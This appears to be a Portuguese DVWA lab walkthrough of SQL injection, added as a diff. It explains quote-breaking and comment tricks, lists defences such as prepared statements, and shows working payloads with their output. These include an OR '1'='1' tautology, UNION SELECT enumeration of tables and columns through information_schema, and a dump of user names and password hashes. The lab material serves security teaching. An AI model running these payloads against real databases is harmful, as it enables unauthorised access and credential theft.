@@ -1,0 +1,280 @@
+DVWA SQL INJECTION LOW
+
+1 = De acordo com o ID colocado o mesmo retorna o nome da conta
+
+User ID: 1 Submit
+
+ID: 1
+First name: admin
+Surname: admin
+
+ID: 2
+First name: Gordon
+Surname: Brown
+
+2 = Mas e se executarmos essa string ? 1' OR '1'='1'# ?
+
+###################################################################################
+
+Explicação Do Comando 1'
+
+A parte 1' é uma tentativa de interromper a sintaxe correta de uma consulta SQL, 
+inserindo um valor que termina com um apóstrofo ('). 
+
+Vou explicar em detalhes:
+
+Contexto de 1'
+Em muitas linguagens SQL, valores literais de texto são colocados entre aspas 
+simples ('). Por exemplo, numa consulta SQL típica, você pode ver algo assim:
+
+SELECT * FROM usuarios WHERE nome = 'admin';
+
+Aqui, o valor 'admin' está entre aspas simples, delimitando um texto.
+
+Agora, considere o caso onde a consulta SQL é construída dinamicamente 
+a partir de uma entrada do usuário. Se o sistema estiver mal protegido 
+e concatenar diretamente as entradas do usuário na consulta SQL, 
+você pode acabar com algo assim:
+
+SELECT * FROM usuarios WHERE nome = 'admin' AND senha = 'senha123';
+
+
+
+Se o atacante insere 1' no campo de senha, a consulta pode ser quebrada, 
+causando um erro ou permitindo a injeção de código. O resultado seria algo assim:
+
+SELECT * FROM usuarios WHERE nome = 'admin' AND senha = '1';
+Aqui, o '1 interrompe o fechamento correto da aspas, criando 
+uma estrutura de consulta incorreta. A ideia do atacante é causar um erro de 
+sintaxe ou preparar o campo para uma injeção de código subsequente, 
+como no exemplo anterior:
+
+
+
+Combinando 1' OR '1'='1'#
+Agora, se o atacante continuar com a expressão OR '1'='1', a consulta se tornaria:
+
+SELECT * FROM usuarios WHERE nome = 'admin' AND senha = '1' OR '1'='1'#;
+
+
+
+O '1' termina a string de senha de forma incorreta.
+O operador OR é adicionado para manipular a lógica da consulta, 
+tornando a condição sempre verdadeira, já que '1'='1' sempre será verdadeiro.
+
+Conclusão
+O 1' sozinho não tem um significado especial por si só, mas faz parte de uma 
+tentativa de manipular ou "quebrar" a consulta SQL através da interrupção da 
+estrutura esperada. Quando combinado com outras partes da injeção, como o OR '1'='1'#, 
+o atacante pode manipular a consulta para atingir seu objetivo, 
+como acessar dados indevidos ou bypassar uma autenticação
+
+
+
+Explicação Do Comando #
+
+O símbolo # no final de uma expressão em um ataque de SQL Injection é usado 
+como um comentário na maioria das linguagens SQL. Ele serve para ignorar o restante 
+da consulta que vem depois, evitando que a parte original da consulta cause 
+problemas ou torne a injeção ineficaz.
+
+
+###################################################################################
+
+Explicação Do Comando 1' OR '1'='1'#
+
+O atacante insere a string 1' OR '1'='1'# em um campo de entrada (como um campo de login ou senha).
+Se o sistema não fizer uma validação adequada da entrada, essa string é inserida diretamente na consulta SQL.
+Por exemplo, considere um sistema de login com a seguinte consulta SQL:
+
+SELECT * FROM usuarios WHERE usuario = 'admin' AND senha = 'senha123';
+
+Se um atacante colocar 1' OR '1'='1'# no campo de senha, a consulta resultante pode ser algo assim:
+
+SELECT * FROM usuarios WHERE usuario = 'admin' AND senha = 1' OR '1'='1'#
+
+A cláusula OR '1'='1'# é sempre verdadeira, porque 1 = 1 é logicamente verdadeiro. 
+Isso significa que a consulta SQL pode retornar todos os registros da tabela usuarios, 
+permitindo o acesso não autorizado.
+
+Consequências:
+O atacante pode burlar o sistema de autenticação e obter acesso a áreas restritas.
+Dependendo da consulta, isso pode até permitir que o invasor modifique, exclua ou visualize dados confidenciais.
+
+
+Como se proteger?
+Validação de entradas: Sanitizar e validar as entradas de usuário.
+Uso de prepared statements: Consultas SQL parametrizadas evitam que entradas do usuário sejam executadas diretamente como comandos SQL.
+Privilégios limitados: Restringir permissões de acesso ao banco de dados para evitar danos maiores caso ocorra uma invasão.
+Essa técnica é uma das vulnerabilidades mais comuns listadas pela OWASP (Open Web Application Security Project).
+
+
+##########################################################################
+
+3 = Se executar esse comando 1' OR '1'='1'# ///// ' OR '1' = '1'#
+
+O mesmo vai travar e mostrar todos os dados cadastrados.
+
+ID: 1' OR '1'='1'#
+First name: admin
+Surname: admin
+ID: 1' OR '1'='1'#
+First name: Gordon
+Surname: Brown
+ID: 1' OR '1'='1'#
+First name: Hack
+Surname: Me
+ID: 1' OR '1'='1'#
+First name: Pablo
+Surname: Picasso
+ID: 1' OR '1'='1'#
+First name: Bob
+Surname: Smith
+
+4 = Se executar esse comando 'UNION SELECT table_name, NULL FROM information_schema.tables#
+
+O mesmo vai fornecer todas as tabelas existentes no sistema
+
+ID: 'UNION SELECT table_name, NULL FROM information_schema.tables#
+First name: ALL_PLUGINS
+Surname: 
+ID: 'UNION SELECT table_name, NULL FROM information_schema.tables#
+First name: APPLICABLE_ROLES
+Surname: 
+ID: 'UNION SELECT table_name, NULL FROM information_schema.tables#
+First name: CHARACTER_SETS
+Surname: 
+ID: 'UNION SELECT table_name, NULL FROM information_schema.tables#
+First name: CHECK_CONSTRAINTS
+Surname: 
+ID: 'UNION SELECT table_name, NULL FROM information_schema.tables#
+First name: COLLATIONS
+Surname: 
+ID: 'UNION SELECT table_name, NULL FROM information_schema.tables#
+First name: COLLATION_CHARACTER_SET_APPLICABILITY
+Surname: 
+ID: 'UNION SELECT table_name, NULL FROM information_schema.tables#
+First name: COLUMNS
+Surname: 
+
+
+
+ID: 'UNION SELECT table_name, NULL FROM information_schema.tables#
+First name: users   <--- Achamos a tabela de usuários
+Surname: 
+
+##########################################################################
+
+5 = Se executar esse comando 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+
+O mesmo irá fornecer o nome de todas as colunas da tabela users
+
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: user_id
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: first_name
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: last_name
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: user
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: password
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: avatar
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: last_login
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: failed_login
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: CURRENT_CONNECTIONS
+Surname: 
+ID: 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users'#
+First name: TOTAL_CONNECTIONS
+Surname: 
+
+##########################################################################
+
+6 = Finalmente podemos mandar este comando 'UNION SELECT user, password FROM users#
+
+Onde o mesmo irá mostrar o resultado dos campos user and password da tabela users
+
+ID: 'UNION SELECT user, password FROM users#
+First name: admin
+Surname: 25f9e794323b453885f5181f1b624d0b
+ID: 'UNION SELECT user, password FROM users#
+First name: gordonb
+Surname: e99a18c428cb38d5f260853678922e03
+ID: 'UNION SELECT user, password FROM users#
+First name: 1337
+Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+ID: 'UNION SELECT user, password FROM users#
+First name: pablo
+Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+ID: 'UNION SELECT user, password FROM users#
+First name: smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+#######################################################################################################
+
+MEDIUM
+
+Obs: Procedimento feito no Firefox Developer 131.0b6(64bits). 
+
+1 = Vá na inspeção de elementos e em seguida Network. Não haverá nada, 
+neste caso faça uma requisição submit. E procure pela requição POST
+e clique em cima, depois escolha botão direito do mouse e vá em Edit/Resend
+
+2 = No canto esquerdo em Body edite o valor de id=1 para id=3
+como forma de teste. Clique em Send. Depois do lado direito da página vá em Response
+
+3 = No lugar de id=1 coloque 
+
+id=1 UNION SELECT user, password FROM users#&Submit=Submit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
